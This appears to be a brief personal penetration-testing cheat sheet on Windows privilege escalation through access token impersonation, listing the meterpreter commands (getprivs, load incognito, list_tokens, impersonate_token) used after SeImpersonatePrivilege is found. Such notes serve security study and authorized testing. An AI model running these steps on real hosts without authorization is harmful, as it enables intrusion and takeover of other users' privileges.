# Access Token Impersination

---

is an form of priv esc in windows environment.

#### Metasploit

once we have a meterpreter session we can make getrprivs

getprivs

if "SeImpersonatePrivilege" is there, we can exploit it. 

load incognito

list_tokens -u --> shows available tokens 

impersonate_token "<delegation token>" 

getuid --> gained privs of <delegation token>


